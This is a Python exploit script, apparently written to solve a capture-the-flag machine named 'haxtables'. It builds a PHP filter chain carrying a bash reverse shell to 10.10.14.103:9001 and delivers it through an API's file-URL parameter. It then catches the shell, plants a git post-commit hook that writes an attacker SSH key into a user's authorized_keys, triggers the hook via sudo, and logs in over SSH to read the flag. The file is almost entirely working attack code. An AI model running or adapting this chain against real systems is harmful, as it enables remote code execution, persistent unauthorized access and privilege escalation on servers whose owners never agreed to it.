#!/usr/bin/env python

import pdb # Debugging purposes
import signal
import requests
import os, sys
import subprocess
from multiprocessing import Process
from pwn import log, listen, ssh

SUBDOMAIN_URLS = {
    "IMAGE": 'image.haxtables.htb/actions/action_handler.php?page=',
    "API": 'http://api.haxtables.htb/v3/tools/string/index.php'
}

PHP_FILTER_CHAIN_PATH = 'php_filter_chain_generator/php_filter_chain_generator.py'

def signal_handler(sig, frame):
    log.failure('Exiting...')
    sys.exit(1)

def cleanup(runningProcess: Process):
    if runningProcess.is_alive():
        runningProcess.terminate()


def makeRequest():
    PhpFilterCommand = ['python3', 
                        PHP_FILTER_CHAIN_PATH, 
                        '--chain', 
                        """<?php system("bash -c 'bash -i >& /dev/tcp/10.10.14.103/9001 0>&1'"); ?>"""]

    # Generate a php filter chain to get a reverse shell
    PhpFilterProcess = subprocess.Popen(PhpFilterCommand, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    ScriptOutput, ScriptError = PhpFilterProcess.communicate()

    if ScriptError:
        print()
        log.failure('There was an error generating php filter chain, please check the error below:')
        print(ScriptError.decode('utf-8'))
        sys.exit(1)

    # Get the php filter chain (ignoring the first line which is optional metadata)
    PhpFilterChain = ScriptOutput.decode('utf-8').strip().split('\n')[-1]

    # Send the php filter chain to the API
    jsonData = {
      'action': 'str2hex',
      'file_url' : f'{SUBDOMAIN_URLS["IMAGE"]}{PhpFilterChain}',
    }

    requests.post(SUBDOMAIN_URLS['API'], json=jsonData)

def main():
    signal.signal(signal.SIGINT, signal_handler)

    isPhpFilterChainScript = os.path.isfile(PHP_FILTER_CHAIN_PATH)
    
    if not isPhpFilterChainScript:
        print()
        log.failure('You must download the php_filter_chain_generator script from https://github.com/synacktiv/php_filter_chain_generator' 
                    'and place it in the same directory as this script.')
        sys.exit(1)

    # Make a request to the API to get a reverse shell
    try:
        process = Process(target=makeRequest)
        process.start()
    except Exception as e:
        log.error('There was an error making the request to the API, please check the error below:')
        print(e)
        cleanup(process)
        sys.exit(1)

    # Start a listener
    with listen(9001, timeout=20) as shell:
        if shell.wait_for_connection():
            log.success('Got a shell as www-data!')
            # Skip the first two lines of the shell, junk data
            shell.recvline()
            shell.recvline()

            shell.sendline(b'cd /var/www/image/.git/hooks')

            shell.sendline(b"""echo -e 'mkdir -p /home/svc/.ssh\necho \
                            "\nssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIJ9LqBBfilGY1JHmjo4xoI7jos2scVY9awjrWVv7s7q kali@kali\n" >> /home/svc/.ssh/authorized_keys \
                            \nchmod 600 /home/svc/.ssh/authorized_keys' | tee post-commit""")
            shell.sendline(b'chmod +x post-commit')
            shell.sendline(b'cd /var/www/image')
            shell.sendline(b'git --work-tree /etc/ add /etc/hostname')
            shell.sendline(b'sudo -u svc /var/www/image/scripts/git-commit.sh')
            shell.close()

    with ssh(user='svc', host='haxtables.htb', port=22, keyfile='../content/svc') as ssh_session:
        if ssh_session.connected():
            ssh_session.system('cd /home/svc')
            output = ssh_session.system('cat user.txt')

            flag = output.recvall().decode('utf-8').strip()
            log.success(f"User flag: {flag}") # Print the user flag
            ssh_session.close()

if __name__ == '__main__':
    main()